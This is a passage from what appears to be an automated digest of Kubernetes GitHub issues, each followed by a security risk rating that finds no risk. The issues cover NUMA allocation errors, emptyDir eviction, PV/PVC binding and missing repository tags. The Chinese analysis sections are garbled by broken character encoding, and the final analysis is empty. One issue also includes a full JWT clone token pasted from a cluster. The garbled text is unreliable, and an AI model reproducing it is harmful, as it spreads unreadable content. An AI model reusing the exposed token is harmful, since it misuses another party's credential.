Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.638367 2326 policy_static.go:123] "Got topology affinity" pod="default/kube-mgrr-2" podUID="2e769357-b700-49fa-96dc-2416a0379cb9" containerName="kube-mgrr-2" hint={"NUMANodeAffinity":1,"Preferred":true}
Nov 08 19:34:55 minikube kubelet[2326]: E1108 19:34:55.638418 2326 memory_manager.go:257] "Allocate error" err="[memorymanager] failed to find NUMA nodes to extend the current topology hint"
Nov 08 19:34:55 minikube kubelet[2326]: I1108 19:34:55.638450 2326 kubelet.go:2306] "Pod admission denied" podUID="2e769357-b700-49fa-96dc-2416a0379cb9" pod="default/kube-mgrr-2" reason="UnexpectedAdmissionError" message="Allocate failed due to [memorymanager] failed to find NUMA nodes to extend the current topology hint, which is unexpected"


I modified the second pod to request '200m' worth of CPU rather than a whole CPU, and the pod started up as expected.


#### What did you expect to happen?

The pod should have started up with one exclusive CPU and memory from both NUMA nodes.

#### How can we reproduce it (as minimally and precisely as possible)?

Set the memory manager policy to "Static" and topology manager policy to "restricted". On a two-NUMA-node worker node create a smallish Pod with a single exclusive CPU (request/limit both 1 cpu) that easily fits on one NUMA node worth of memory. Create a second Pod in the Guaranteed QoS class with a big enough memory request that it cannot fit on one NUMA node, with cpu request/limit both set to 1 cpu. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
cfriesen@debian:~$ minikube kubectl -- version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.2

```

</details>


#### Cloud provider

<details>
n/a
</details>


#### OS version

<details>

```console
# On Linux:
cfriesen@debian:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
cfriesen@debian:~$ uname -a
Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux


```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†åœ¨ Kubernetes ä¸­ä½¿ç”¨ NUMA æ„ŸçŸ¥çš„å†…å­˜ç®¡ç†å™¨å’Œæ‹“æ‰‘ç®¡ç†å™¨ç­–ç•¥ä¸º "restricted" æ—¶ï¼Œé‡åˆ°äº† UnexpectedAdmissionErrorã€‚å…·ä½“æ¥è¯´ï¼Œç”¨æˆ·å°è¯•åˆ›å»ºä¸€ä¸ªè¯·æ±‚ 1 ä¸ª CPU å’Œ 9Gi å†…å­˜çš„ Podï¼Œä»¥å¼ºåˆ¶å…¶ä»ä¸¤ä¸ª NUMA èŠ‚ç‚¹åˆ†é…å†…å­˜ï¼Œä½†å‡ºç°äº†é”™è¯¯ã€‚

ä» kubelet æ—¥å¿—ä¸­å¯ä»¥çœ‹å‡ºï¼Œå†…å­˜ç®¡ç†å™¨æ— æ³•æ‰¾åˆ°é€‚å½“çš„ NUMA èŠ‚ç‚¹æ¥æ»¡è¶³å½“å‰çš„æ‹“æ‰‘æç¤ºï¼Œå¯¼è‡´äº†åˆ†é…å¤±è´¥ã€‚è¿™æ˜¯ Kubernetes åœ¨ç‰¹å®šèµ„æºè¯·æ±‚å’Œé…ç½®ä¸‹çš„èµ„æºè°ƒåº¦é—®é¢˜ã€‚

æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œæ­¤é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é”™è¯¯ï¼Œæ¶‰åŠåˆ°èµ„æºè°ƒåº¦å’Œåˆ†é…ç­–ç•¥çš„å®ç°ï¼Œå¹¶æœªæ¶‰åŠä»»ä½•å®‰å…¨æ¼æ´ã€‚æ²¡æœ‰è¿¹è±¡è¡¨æ˜æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤é”™è¯¯è¿›è¡Œæ”»å‡»ï¼Œä¹Ÿæ²¡æœ‰æ¶‰åŠæ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–é«˜é£é™©çš„å®‰å…¨é—®é¢˜ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤ Issue ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128693 The extra-dirs flag present in conversion-gen but not wired

- Issue é“¾æ¥ï¼š[#128693](https://github.com/kubernetes/kubernetes/issues/128693)

### Issue å†…å®¹

#### What happened?

The `extra-dirs` flag option is present in conversion-gen cmd but it is not wired in the code. Any inputs from `extra-dirs` are entirely unused and this can lead to confusion when those dirs are not considered during conversion-gen. It seems the `extra-dirs` is deprecated but the `extra-dirs` flag is the leftover that should be removed eventually.

#### What did you expect to happen?

The `extra-dirs` flag shouldn't be an option in conversion-gen anymore. The conversion-gen cmd should err out if `extra-dirs` flag is included.

#### How can we reproduce it (as minimally and precisely as possible)?

Use `conversion-gen` with `extra-dirs` flag and those inputs are not used but there is no error reported.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
1.31

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>
NA
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡º`conversion-gen`å‘½ä»¤ä¸­å­˜åœ¨ä¸€ä¸ª`--extra-dirs`çš„æ ‡å¿—å‚æ•°ï¼Œä½†åœ¨ä»£ç ä¸­å¹¶æœªå®é™…ä½¿ç”¨è¯¥å‚æ•°ã€‚å› æ­¤ï¼Œå½“ç”¨æˆ·ä½¿ç”¨`--extra-dirs`æä¾›è¾“å…¥æ—¶ï¼Œè¿™äº›è¾“å…¥å°†è¢«å¿½ç•¥ï¼Œå¯èƒ½å¯¼è‡´ç”¨æˆ·å›°æƒ‘ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šè¿™ä¸ªé—®é¢˜ä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå› ä¸ºæœªä½¿ç”¨çš„å‚æ•°ä¸ä¼šå¼•å…¥æ–°çš„æ”»å‡»é¢ã€‚

2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šè¯¥é—®é¢˜ä¸ç¬¦åˆCVEæ¼æ´çš„å®šä¹‰ï¼Œä¸ä¼šå¯¹ç³»ç»Ÿçš„ä¿å¯†æ€§ã€å®Œæ•´æ€§æˆ–å¯ç”¨æ€§é€ æˆå½±å“ã€‚

3. **Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠ**ï¼šæ­¤Issueå±äºåŠŸèƒ½æ€§é—®é¢˜æˆ–ä»£ç æ¸…ç†ï¼Œä¸æ¶‰åŠå®‰å…¨æ€§ã€‚

å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128604 Container using in Memory emptyDir was Evicted on DiskPressure

- Issue é“¾æ¥ï¼š[#128604](https://github.com/kubernetes/kubernetes/issues/128604)

### Issue å†…å®¹

#### What happened?

This is my Pod/Container definition:

```
apiVersion: v1
kind: Pod
metadata:
  annotations:
    prometheus.io/path: /metrics
    prometheus.io/port: "1024"
    prometheus.io/scrape: "true"
  labels:
    app: ingress-haproxy-internal
    app.kubernetes.io/instance: ingress-haproxy-internal
    app.kubernetes.io/name: kubernetes-ingress
    controller-revision-hash: 7b74744854
    pod-template-generation: "5"
  name: ingress-haproxy-internal-kubernetes-ingress-fbdc9
  namespace: ingress-haproxy
spec:
  containers:
  - args:
    - --default-ssl-certificate=ingress-haproxy/ingress-haproxy-internal-kubernetes-ingress-default-cert
    - --configmap=ingress-haproxy/ingress-haproxy-internal-kubernetes-ingress
    - --http-bind-port=8080
    - --https-bind-port=8443
    - --ingress.class=haproxy-int
    - --publish-service=ingress-haproxy/ingress-haproxy-internal-kubernetes-ingress
    - --log=info
    - --prometheus
    env:
    - name: POD_NAME
      valueFrom:
        fieldRef:
          apiVersion: v1
          fieldPath: metadata.name
    - name: POD_NAMESPACE
      valueFrom:
        fieldRef:
          apiVersion: v1
          fieldPath: metadata.namespace
    - name: POD_IP
      valueFrom:
        fieldRef:
          apiVersion: v1
          fieldPath: status.podIP
    image: hub.willhaben.at:8448/haproxytech/kubernetes-ingress:3.0.4
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 3
      httpGet:
        path: /healthz
        port: 1042
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    name: kubernetes-ingress-controller
    ports:
    - containerPort: 8080
      name: http
      protocol: TCP
    - containerPort: 8443
      name: https
      protocol: TCP
    - containerPort: 1024
      name: stat
      protocol: TCP
    readinessProbe:
      failureThreshold: 3
      httpGet:
        path: /healthz
        port: 1042
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    resources:
      requests:
        cpu: 100m
        memory: 512Mi
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        add:
        - NET_BIND_SERVICE
        drop:
        - ALL
      runAsGroup: 1000
      runAsNonRoot: true
      runAsUser: 1000
      seccompProfile:
        type: RuntimeDefault
    startupProbe:
      failureThreshold: 20
      httpGet:
        path: /healthz
        port: 1042
        scheme: HTTP
      periodSeconds: 1
      successThreshold: 1
      timeoutSeconds: 1
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /tmp
      name: tmp
      subPath: tmp
    - mountPath: /run
      name: tmp
      subPath: run
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-fffsq
      readOnly: true
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  nodeName: ip-10-11-24-31.eu-central-1.compute.internal
  preemptionPolicy: PreemptLowerPriority
  priority: 0
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext:
    runAsGroup: 1000
    runAsNonRoot: true
    runAsUser: 1000
  serviceAccount: ingress-haproxy-internal-kubernetes-ingress
  serviceAccountName: ingress-haproxy-internal-kubernetes-ingress
  terminationGracePeriodSeconds: 60
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/disk-pressure
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/memory-pressure
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/pid-pressure
    operator: Exists
  - effect: NoSchedule
    key: node.kubernetes.io/unschedulable
    operator: Exists
  volumes:
  - emptyDir:
      medium: Memory
      sizeLimit: 64Mi
    name: tmp
  - name: kube-api-access-fffsq
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
```

and among all other pods it got evicted as first on DiskPressure with the following message:

```
The node was low on resource: ephemeral-storage. Threshold quantity: 2139512454, available: 1732380Ki. Container kubernetes-ingress-controller was using 27984Ki, request is 0, has larger consumption of ephemeral-storage. 
```

#### What did you expect to happen?

The `27984Ki` should count as memory usage and not ephemeral storage usage, therefore my pod should not Evicted because it's using more ephemeral-storage than the request 

#### How can we reproduce it (as minimally and precisely as possible)?

1. Run a Pod with in Memory emptyDir volume
2. Write something in the volume
3. Check the node /stats/summary 
4. The container should not report any ephemral storage usage

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.2
Kustomize Version: v5.4.2
Server Version: v1.31.0-eks-a737599
```

</details>


#### Cloud provider

<details>
EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2023"
ID="amzn"
ID_LIKE="fedora"
VERSION_ID="2023"
PLATFORM_ID="platform:al2023"
PRETTY_NAME="Amazon Linux 2023.5.20240916"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2023"
HOME_URL="https://aws.amazon.com/linux/amazon-linux-2023/"
DOCUMENTATION_URL="https://docs.aws.amazon.com/linux/"
SUPPORT_URL="https://aws.amazon.com/premiumsupport/"
BUG_REPORT_URL="https://github.com/amazonlinux/amazon-linux-2023"
VENDOR_NAME="AWS"
VENDOR_URL="https://aws.amazon.com/"
SUPPORT_END="2028-03-15"
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥IssueæŠ¥å‘Šäº†åœ¨ä½¿ç”¨`emptyDir`å·ï¼ˆè®¾ç½®ä¸º`medium: Memory`ï¼‰çš„æƒ…å†µä¸‹ï¼Œå®¹å™¨ä»ç„¶å› ä¸ºç£ç›˜å‹åŠ›ï¼ˆDiskPressureï¼‰è€Œè¢«é©±é€çš„é—®é¢˜ã€‚è¿™ä¸ªé—®é¢˜æ¶‰åŠKubernetesåœ¨èµ„æºç®¡ç†ä¸Šçš„è¡Œä¸ºï¼Œä¸å®¹å™¨èµ„æºç»Ÿè®¡å’Œè°ƒåº¦ç­–ç•¥ç›¸å…³ï¼Œä½†å¹¶ä¸æ¶‰åŠä»»ä½•å®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼šå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚å› æ­¤ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128594 kubectl get cs only show one etcd

- Issue é“¾æ¥ï¼š[#128594](https://github.com/kubernetes/kubernetes/issues/128594)

### Issue å†…å®¹

#### What happened?


```shell
kubectl get cs
Warning: v1 ComponentStatus is deprecated in v1.19+
NAME                 STATUS    MESSAGE   ERROR
controller-manager   Healthy   ok
scheduler            Healthy   ok
etcd-0               Healthy   ok
```


#### What did you expect to happen?

show three etcd

```shell
kubectl get cs
Warning: v1 ComponentStatus is deprecated in v1.19+
NAME                 STATUS    MESSAGE   ERROR
etcd-0               Healthy   ok
scheduler            Healthy   ok
controller-manager   Healthy   ok
etcd-2               Healthy   ok
etcd-1               Healthy   ok
```

#### How can we reproduce it (as minimally and precisely as possible)?

k8s version 1.28.12 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Client Version: v1.28.15
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.15
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨`kubectl get cs`å‘½ä»¤æ—¶ï¼Œåªæ˜¾ç¤ºäº†ä¸€ä¸ªetcdå®ä¾‹ï¼Œè€Œé¢„æœŸåº”è¯¥æ˜¾ç¤ºä¸‰ä¸ªetcdå®ä¾‹ã€‚åŒæ—¶ï¼Œå‘½ä»¤è¾“å‡ºä¸­æç¤º`v1 ComponentStatus is deprecated in v1.19+`ï¼Œè¯´æ˜`kubectl get cs`å‘½ä»¤åœ¨Kubernetes 1.19åŠä»¥ä¸Šç‰ˆæœ¬ä¸­å·²è¢«å¼ƒç”¨ï¼Œå¯èƒ½æ— æ³•æ­£ç¡®æ˜¾ç¤ºç»„ä»¶çŠ¶æ€ã€‚è¿™æ˜¯ç”±äºä½¿ç”¨äº†å·²å¼ƒç”¨çš„å‘½ä»¤å¯¼è‡´çš„æ˜¾ç¤ºé—®é¢˜ï¼Œå±äºåŠŸèƒ½æ€§é—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼Œå¦‚æœIssueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ï¼Œåˆ™é£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

## Issue #128568 pv is bound to pvc, but pvc is pending

- Issue é“¾æ¥ï¼š[#128568](https://github.com/kubernetes/kubernetes/issues/128568)

### Issue å†…å®¹

#### What happened?

I have a pvc1: `tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a`,  and bound to pv: `pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996`. I changed the claimRef of pv:`pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996` to pvc2:`f55bp1pq6y`, pv status is bound and bound to pvc2:`f55bp1pq6y`. But pvc2:`f55bp1pq6y` status is still pending, and pvc1:`tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a` status is lost.
```
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  annotations:
    cdi.kubevirt.io/clonePhase: Pending
    cdi.kubevirt.io/cloneType: csi-clone
    cdi.kubevirt.io/createdForDataVolume: 417bdae0-3eb3-4be1-a438-fcf972d7a0ff
    cdi.kubevirt.io/dataSourceNamespace: default
    cdi.kubevirt.io/storage.clone.token: eyJhbGciOiJQUzI1NiJ9.eyJleHAiOjE3MzA4MDQwOTksImlhdCI6MTczMDgwMzc5OSwiaXNzIjoiY2RpLWFwaXNlcnZlciIsIm5hbWUiOiJpbWctZjlqc242ZXMtY2VwaC1ibG9jayIsIm5hbWVzcGFjZSI6ImRlZmF1bHQiLCJuYmYiOjE3MzA4MDM3OTksIm9wZXJhdGlvbiI6IkNsb25lIiwicGFyYW1zIjp7InRhcmdldE5hbWUiOiJ2NzFnYmF1bXkzIiwidGFyZ2V0TmFtZXNwYWNlIjoid3l3LXRlc3QtZHYifSwicmVzb3VyY2UiOnsiZ3JvdXAiOiIiLCJyZXNvdXJjZSI6InBlcnNpc3RlbnR2b2x1bWVjbGFpbXMiLCJ2ZXJzaW9uIjoidjEifX0.SUaSFke9zXFcNDVLD1eM_3RrdbYl1qkmXROeshIbaP_ltrklDouOalJk7sROjGjTKDsUhdKqPfvjnNauM1JWxR1fGjzTuPi-GJVK8W9l8U9N6BTyze9swf4lsZMp0pY1GhFuqbPubfSvvUxvmQkg4Tc2GPGqCUYcm22w3N2zl5xBzGRi4Ugsr4vWdttu-ajTSlAb966LOL598AI5XUIDdOdL6wiu9QtHfR39amvRgxWpl_powtQlC1w8Jj0xta1I3BcGypi_KHhK6L36W7nJk6ko_-E0nxpNSy1bHzK_N8no0a3jYQJ1Sl0320aeeLvFwMB6BwIcCFttkLHjZ2opWA
    cdi.kubevirt.io/storage.condition.running: "false"
    cdi.kubevirt.io/storage.condition.running.message: Clone Pending
    cdi.kubevirt.io/storage.condition.running.reason: Pending
    cdi.kubevirt.io/storage.contentType: kubevirt
    cdi.kubevirt.io/storage.pod.restarts: "0"
    cdi.kubevirt.io/storage.populator.kind: VolumeCloneSource
    cdi.kubevirt.io/storage.preallocation.requested: "false"
    cdi.kubevirt.io/storage.usePopulator: "true"
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"cdi.kubevirt.io/v1beta1","kind":"DataVolume","metadata":{"annotations":{},"name":"v71gbaumy3","namespace":"wyw-test-dv"},"spec":{"pvc":{"accessModes":["ReadWriteOnce"],"resources":{"requests":{"storage":"50Gi"}},"storageClassName":"ceph-block","volumeMode":"Block"},"source":{"pvc":{"name":"img-f9jsn6es-ceph-block","namespace":"default"}}}}
    pv.kubernetes.io/bind-completed: "yes"
    pv.kubernetes.io/bound-by-controller: "yes"
    volume.beta.kubernetes.io/storage-provisioner: rook-ceph.rbd.csi.ceph.com
    volume.kubernetes.io/storage-provisioner: rook-ceph.rbd.csi.ceph.com
  creationTimestamp: "2024-11-05T10:50:07Z"
  finalizers:
  - kubernetes.io/pvc-protection
  labels:
    app: containerized-data-importer
    app.kubernetes.io/component: storage
    app.kubernetes.io/managed-by: cdi-controller
    cdi.kubevirt.io/OwnedByUID: e80fc9be-821f-452a-9b03-bb5bbadb5094
  name: tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a
  namespace: default
  resourceVersion: "10612580"
  uid: 11ee3bfa-a558-4464-9466-dc6d6fb6047c
spec:
  accessModes:
  - ReadWriteOnce
  dataSource:
    apiGroup: null
    kind: PersistentVolumeClaim
    name: img-f9jsn6es-ceph-block
  dataSourceRef:
    apiGroup: null
    kind: PersistentVolumeClaim
    name: img-f9jsn6es-ceph-block
  resources:
    requests:
      storage: 50Gi
  storageClassName: ceph-block
  volumeMode: Block
  volumeName: pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996
status:
  accessModes:
  - ReadWriteOnce
  capacity:
    storage: 50Gi
  phase: Bound
```
after updating pv claimRef to pvc2:`f55bp1pq6y`:
```
# kubectl get pvc | grep -i lost
tmp-pvc-1d9c5916-c994-42e5-8060-99d563b43e3a   Lost      pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996   0                         ceph-block     153m

[root@rongqi-node01 batch-create]# kubectl get pv pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996 
NAME                                       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                    STORAGECLASS   REASON   AGE
pvc-a4ec28db-8fed-4067-8a19-ba0ff65b4996   40Gi       RWO            Retain           Bound    wyw-test-dv/f55bp1pq6y   ceph-block              158m
```

#### What did you expect to happen?

after updating pv claimRef to pvc2:`f55bp1pq6y`, pvc2:`f55bp1pq6y` status is bound.

#### How can we reproduce it (as minimally and precisely as possible)?

I encountered this problem when using the cdi project:
[https://github.com/kubevirt/containerized-data-importer/issues/3470](url)

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.6", GitCommit:"741c8db18a52787d734cbe4795f0b4ad860906d6", GitTreeState:"clean", BuildDate:"2023-09-13T09:21:34Z", GoVersion:"go1.20.8", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.6", GitCommit:"741c8db18a52787d734cbe4795f0b4ad860906d6", GitTreeState:"clean", BuildDate:"2023-09-13T09:14:09Z", GoVersion:"go1.20.8", Compiler:"gc", Platform:"linux/amd64"}

```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# centos 8
$ uname -a
5.10.0-136.12.0.86.4.hl202.x86_64



```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
# kubectl exec -it -n rook-ceph rook-ceph-tools-5877f9f669-n8nfb -- ceph --version
ceph version 18.2.1 (7fe91d5d5842e04be3b4f514d6dd990c54b29c76) reef (stable)
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä¿®æ”¹PVçš„claimRefæŒ‡å‘å¦ä¸€ä¸ªPVCåï¼ŒPVCçš„çŠ¶æ€æœªæ­£ç¡®æ›´æ–°çš„é—®é¢˜ã€‚è¿™æ¶‰åŠåˆ°Kubernetesä¸­PVå’ŒPVCä¹‹é—´ç»‘å®šçŠ¶æ€çš„ä¸ä¸€è‡´ï¼Œå¯èƒ½å¯¼è‡´èµ„æºä½¿ç”¨ä¸Šçš„æ··ä¹±ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼š

1. **æƒé™è¦æ±‚**ï¼šæ‰‹åŠ¨ä¿®æ”¹PVçš„claimReféœ€è¦å¯¹PVèµ„æºå…·æœ‰ç¼–è¾‘æƒé™ï¼Œè¿™é€šå¸¸æ˜¯cluster-adminæˆ–å…·æœ‰é«˜æƒé™çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œçš„æ“ä½œã€‚æ™®é€šç”¨æˆ·æ— æ³•éšæ„ä¿®æ”¹PVçš„ç»‘å®šå…³ç³»ã€‚

2. **æ•°æ®è®¿é—®**ï¼šå³ä½¿ä¿®æ”¹äº†PVçš„claimRefï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿå°†PVç»‘å®šåˆ°è‡ªå·±çš„PVCä¸Šï¼Œå¯èƒ½ä¼šå°è¯•è®¿é—®åˆ°ä¸å±äºè‡ªå·±çš„æŒä¹…åŒ–æ•°æ®ã€‚ä½†ç”±äºä¿®æ”¹PVéœ€è¦é«˜æƒé™ï¼Œè€Œæ‹¥æœ‰æ­¤æƒé™çš„ç”¨æˆ·æœ¬èº«å°±æœ‰æƒé™è®¿é—®è¿™äº›æ•°æ®ï¼Œå› æ­¤ä¸å­˜åœ¨æƒé™æå‡çš„é—®é¢˜ã€‚

3. **é£é™©è¯„ä¼°**ï¼šæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬4æ¡ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å®æ–½æ”»å‡»ï¼ˆå¦‚éœ€è¦åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼‰ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

4. **æ•æ„Ÿä¿¡æ¯**ï¼šIssueä¸­åŒ…å«äº†JWTä»¤ç‰Œç­‰æ•æ„Ÿä¿¡æ¯ï¼Œä½†æ ¹æ®ç¬¬3æ¡ï¼Œissueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯å±äºæäº¤è€…çš„é—®é¢˜ï¼Œä¸å±äºé¡¹ç›®çš„å®‰å…¨é£é™©ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128549 No older versions of k8s.io/cri-client available in CRI client repo

- Issue é“¾æ¥ï¼š[#128549](https://github.com/kubernetes/kubernetes/issues/128549)

### Issue å†…å®¹

#### What happened?

The repo https://github.com/kubernetes/cri-client only has v0.31 versions available. Older versions are no longer accessible. E.g. https://github.com/kubernetes/cri-client/tree/v0.29.9 directs to a 404 page, but https://github.com/kubernetes/cri-client/tree/v0.31.0 shows the repo at tag v0.31.0

#### What did you expect to happen?

Older versions should be available in the repo

#### How can we reproduce it (as minimally and precisely as possible)?

Go to https://github.com/kubernetes/cri-client/tree/v0.29.9, and Github shows a 404 page.

No tags are available for v0.30 and older when searching for such tags in the repo

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
